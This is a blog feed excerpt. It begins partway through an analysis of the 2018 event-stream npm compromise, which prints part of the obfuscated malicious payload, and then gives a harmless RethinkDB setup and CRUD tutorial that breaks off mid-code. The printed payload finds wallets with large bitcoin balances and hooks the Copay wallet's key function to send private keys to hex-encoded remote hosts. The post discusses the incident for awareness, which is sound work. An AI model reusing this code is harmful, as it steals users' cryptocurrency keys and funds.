</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">i</span>(<span style="color:#e6db74">&#34;636f7061796170692e686f7374&#34;</span>, <span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">n</span>), <span style="color:#a6e22e">i</span>(<span style="color:#e6db74">&#34;3131312e39302e3135312e313334&#34;</span>, <span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">n</span>)
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">l</span>(<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">n</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">cordova</span>) <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cordova</span>.<span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">dataDirectory</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">resolveLocalFileSystemURL</span>(<span style="color:#a6e22e">e</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">getFile</span>(<span style="color:#a6e22e">t</span>, {
</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">create</span><span style="color:#f92672">:</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                        }, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">file</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileReader</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">onloadend</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">n</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">result</span>))
</span></span><span style="display:flex;"><span>                                }, <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                                    <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">abort</span>()
</span></span><span style="display:flex;"><span>                                }, <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">readAsText</span>(<span style="color:#a6e22e">e</span>)
</span></span><span style="display:flex;"><span>                            })
</span></span><span style="display:flex;"><span>                        })
</span></span><span style="display:flex;"><span>                    })
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#a6e22e">t</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">r</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">n</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">r</span>))
</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">storage</span>.<span style="color:#a6e22e">local</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">t</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">n</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>[<span style="color:#a6e22e">t</span>]))
</span></span><span style="display:flex;"><span>                        })
</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">CSSMap</span> <span style="color:#f92672">=</span> {}, <span style="color:#a6e22e">l</span>(<span style="color:#e6db74">&#34;profile&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">t</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">credentials</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">credentials</span>[<span style="color:#a6e22e">t</span>];
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;livenet&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">network</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">l</span>(<span style="color:#e6db74">&#34;balanceCache-&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">walletId</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">=</span> parseFloat(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">balance</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#ae81ff">0</span>]), <span style="color:#e6db74">&#34;btc&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">coin</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;bch&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">coin</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1e3</span> <span style="color:#f92672">||</span> (<span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">CSSMap</span>[<span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">xPubKey</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">r</span>(<span style="color:#e6db74">&#34;c&#34;</span>, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">t</span>)))
</span></span><span style="display:flex;"><span>                    }.<span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">n</span>))
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;bitcore-wallet-client/lib/credentials.js&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">getKeysFunc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">getKeys</span>, <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">getKeys</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getKeysFunc</span>(<span style="color:#a6e22e">e</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">CSSMap</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">CSSMap</span>[<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">xPubKey</span>] <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">CSSMap</span>[<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">xPubKey</span>], <span style="color:#a6e22e">r</span>(<span style="color:#e6db74">&#34;p&#34;</span>, <span style="color:#a6e22e">e</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\\t&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">xPubKey</span>))
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">t</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">cordova</span> <span style="color:#f92672">?</span> document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;deviceready&#34;</span>, <span style="color:#a6e22e">e</span>) <span style="color:#f92672">:</span> <span style="color:#a6e22e">e</span>()
</span></span><span style="display:flex;"><span>}();
</span></span></code></pre></div><p>A few things initially jump out. We can see that the injection code is targeting bitcoin, whether it&rsquo;s targeting vulnerable wallets or attempting to mine coins on remote hosts, it&rsquo;s difficult to decipher from this hacker&rsquo;s spaghetti code. Often times, malicious actors will attempt to make their code as difficult to read and understand as possible. JavaScript minifiers make this easier for them and it can be a real challenge to generate a readable file from minified, abstract code.</p>
<p>In short, the community was able to realize that these two code bits will search for vulnerable crypto-currency wallets, check for the copay NPM module, and attempt to steal the wallets and funds stored within them through the targeted module. Thankfully, this vulnerability is not as far reaching as people first thought it might be. An application must be running this malicious code, the copay dependency, and have a wallet with funds.</p>
<h2 id="aftermath">Aftermath</h2>
<p>The people at NPM quickly took down the malicious version of event stream and the maintainers of the copay module put up a warning about the vulnerability. Unfortunately, the malicious code was not realized for almost 2 months. The last commit to the event stream repository was around September 20th, 2018 and the Github issue that started this was not opened until November 20th, 2018. There&rsquo;s no real way to know how many people were negatively affected by this but it&rsquo;s clear that this vulnerability reached millions of people running the event stream module through some node dependency.</p>
<h2 id="community-standards">Community Standards</h2>
<p>This event triggered a huge backlash from the community. Why was this hacker given maintainer credentials and allowed to have publishing access to the module? Why were the countless other community members not aware of his commits? Who bares the responsibility for this open source project?</p>
<p>Per the open source license provided in the module, we see the following: &lsquo;THE SOFTWARE IS PROVIDED &ldquo;AS IS&rdquo;, WITHOUT WARRANTY OF ANY KIND&rsquo;. Dose this absolve the original creator for his mistake? Dose the sole responsibility lay with the user of the software, regardless of its state? Unfortunately, this leaves many unanswered questions.</p>
<h2 id="should-i-trust-you">Should I Trust You?</h2>
<p>I think it&rsquo;s important to recognize the larger issue here; NPM modules are too easily trusted. I don&rsquo;t know how many times I&rsquo;ve looked online for something, found a package, downloaded it, and used it within my project without question. For all I know, I could be putting my users at risk of some attack by using a malicious dependency. NPM is an amazing tool, but it&rsquo;s important to realize that vulnerabilities exist. Here are some tips for safe NPM package usage:</p>
<ol>
<li>Is the package open source?</li>
<li>Is the package maintained by a community?</li>
<li>Is the community currently active?</li>
<li>How can I contribute to maintain this open source project?</li>
</ol>
<p>By involving yourself in the open source projects that you use, you can become a vigilant member of the community that protects and maintains open source software. Solo hero developers are far and few between, so don&rsquo;t depend on them. Get involved, be apart of the open source community, and contribute to the projects that you use.</p>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>Rethink-DB Cookbook</title>
      <link>https://johncodes.com/posts/rethink-db-cookbook/</link>
      <pubDate>Mon, 05 Nov 2018 21:15:35 -0700</pubDate>
      
      <guid>https://johncodes.com/posts/rethink-db-cookbook/</guid>
      <description>(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed) RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data and is a production ready option for Node infrastructures.
Pre-reqs: Docker, Node, NPM
This post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product.</description>
      <content:encoded><![CDATA[<p>(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed)
RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data  and is a production ready option for Node infrastructures.</p>
<p>Pre-reqs: Docker, Node, NPM</p>
<p>This post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product. You should have some knowledge of docker for this tutorial, but it&rsquo;s not required. However, knowledge of Node and JavaScript will be necessary.</p>
<h1 id="run-the-offical-docker-image">Run the offical Docker Image</h1>
<p>You can pull and run the <a href="https://hub.docker.com/_/rethinkdb/">official</a> rethink docker image to start the database locally. Simply give it a name and you&rsquo;re on your way!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -d -P --name &lt;your container name&gt; rethinkdb
</span></span></code></pre></div><p>To check the port mappings in docker, simply run</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker port &lt;your container name&gt;
</span></span></code></pre></div><p>This will show you something like this:</p>
<pre tabindex="0"><code>28015/tcp -&gt; 0.0.0.0:32769
29015/tcp -&gt; 0.0.0.0:32768
8080/tcp -&gt; 0.0.0.0:32770
</code></pre><p>Each of the local port mappings appear on the right and the docker container exposed ports are on the left.</p>
<p>So, if you wanted to access the containers 8080 port, we would navigate to <code>localhost:32770</code>. We can see this from the example as <code>8080/tcp -&gt; 0.0.0.0:32770</code>.</p>
<p>Alternatively, you can install rethinkdb for your specific machine and run it locally. This can be found on the <a href="https://rethinkdb.com/docs/install/">RethinkDB install page</a>. Using the docker container &amp; image is a nice, light weight, modular way to run rethink, similar to how a production microservice architecture might be configured. I also like being able to control the exact environment that my rethink database is running in, it&rsquo;s ports, and other fun docker quality of life things!</p>
<h1 id="using-the-rethinkdb-admin-pannel">Using the RethinkDB admin pannel</h1>
<p>If using the docker container, navigate to the Admin Panel by going to <code>localhost:32770</code> in a browser. From our previous example, we can see that this local port is mapped to the docker container port 8080 (which is the web admin panel). If you&rsquo;re running rethink on your machine locally, you should be able to simply navigate to <code>localhost:8080</code>.</p>
<p>In the admin pannel, you create new databases, explor data, see logs, track performance, and see what connections are running. Lets create a database with a few tables.</p>
<p>In the top navigation bar, go to the &ldquo;Data Explorer&rdquo; and enter the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">dbCreate</span>(<span style="color:#e6db74">&#39;ships&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">tableCreate</span>(<span style="color:#e6db74">&#39;battle_ships&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">tableCreate</span>(<span style="color:#e6db74">&#39;cruisers&#39;</span>)
</span></span></code></pre></div><p>These raw rethink queries create and build our initial database. This can also be acomplished from &ldquo;Tables&rdquo; in the top navigation bar or right in your node app! However, the &ldquo;Data Explorer&rdquo; is an essential tool for viewing, manuipulating, and creating data. This is a great <a href="https://rethinkdb.com/docs/reql-data-exploration/">link</a> for useful Data Explorer queries.</p>
<h1 id="install-rethink-javascript-drivers-via-npm">Install Rethink javascript drivers via NPM</h1>
<p>In order to use the rethink drivers in our Node app, we need to install them via NPM. From the command line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">npm</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">rethinkdb</span>
</span></span></code></pre></div><p>The <code>node_modules</code> folder will now contain the necessary rethink drivers for accessing our rethink instance. To access the rethink drivers from your Node app, require the drivers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;rethinkdb&#39;</span>);
</span></span></code></pre></div><h1 id="open-a-connection-to-the-rethink-instance">Open a connection to the Rethink instance</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">connection</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// This could also be declared from a .env file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">config</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;32769&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">config</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">conn</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">conn</span>;
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>Now, the connection variable will hold the raw data necessary to connect to the rethink instance. Make special note of what port you specify. This should be the port that maps to 28015 in the docker container.</p>
<p>For this local instance of the rethinkdb, we won&rsquo;t worry too much about dynamic ports or not exposing the ports to the public in production. <a href="https://medium.com/@brucelim/creating-a-rest-api-with-rethinkdb-nodejs-express-81ed12f01e59">Here</a> is a good article about one way you can create production ready ports and configurations.</p>
<p>This step can be quite complicated. You can do a number of things per your needs, including placing this step into some middleware to connect automatically, check the configuration of your database, reconfigure settings if something is wrong, or validate authorization. Check out <a href="https://github.com/rethinkdb/rethinkdb-example-nodejs">this repository</a> from the rethink people for more complex operations around connecting.</p>
<h1 id="basic-crud-operations">Basic Crud Operations</h1>
<h3 id="insert-data">Insert Data</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Inserts 2 battleships
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">table</span>(<span style="color:#e6db74">&#39;battle_ships&#39;</span>).<span style="color:#a6e22e">insert</span>([
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;name&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Arizona&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;size&#39;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;guns&#39;</span><span style="color:#f92672">:</span> [
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;railgun&#39;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;off_shore_missles&#39;</span>
</span></span><span style="display:flex;"><span>  ]
</span></span><span style="display:flex;"><span>  }, {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;name&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Iowa&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;size&#39;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">34</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;guns&#39;</span><span style="color:#f92672">:</span> [
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;light_machine&#39;</span>
</span></span><span style="display:flex;"><span>  ]
</span></span><span style="display:flex;"><span>}]).<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">connection</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">res</span>));
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>We can see that we are inserting raw JSON objects! Awesome! Now, from the Data explorer, if we query the <code>battle_ships</code> table:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">table</span>(<span style="color:#e6db74">&#39;battle_ships&#39;</span>)
</span></span></code></pre></div><p>We will see the following JSON has been entered into the database:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;guns&#34;</span><span style="color:#f92672">:</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;railgun&#34;</span> ,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;off_shore_missles&#34;</span>
</span></span><span style="display:flex;"><span>    ] ,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;35502dbd-0354-4ca8-bef5-06825ab8df26&#34;</span> ,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Arizona&#34;</span> ,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;size&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">22</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;guns&#34;</span><span style="color:#f92672">:</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;light_machine&#34;</span>
</span></span><span style="display:flex;"><span>    ] ,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;b960127b-994f-44b7-88f5-f7463fc90dae&#34;</span> ,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Iowa&#34;</span> ,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;size&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">34</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="getting-data">Getting data</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Get all battle ships
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">table</span>(<span style="color:#e6db74">&#39;battle_ships&#39;</span>)
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">connection</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">cursor</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cursor</span>.<span style="color:#a6e22e">toArray</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">res</span>));
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>In this example, we are getting all the ships in the battle_ships table. Most rethink queries of this size will return a cursor by default, so to get the raw results, we must make it an array with the <code>.toArray</code> method. The callback will contain the results that can than be parsed further.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Get specific battleship
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">table</span>(<span style="color:#e6db74">&#39;battle_ships&#39;</span>)
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;35502dbd-0354-4ca8-bef5-06825ab8df26&#39;</span>)
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">connection</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">res</span>) {
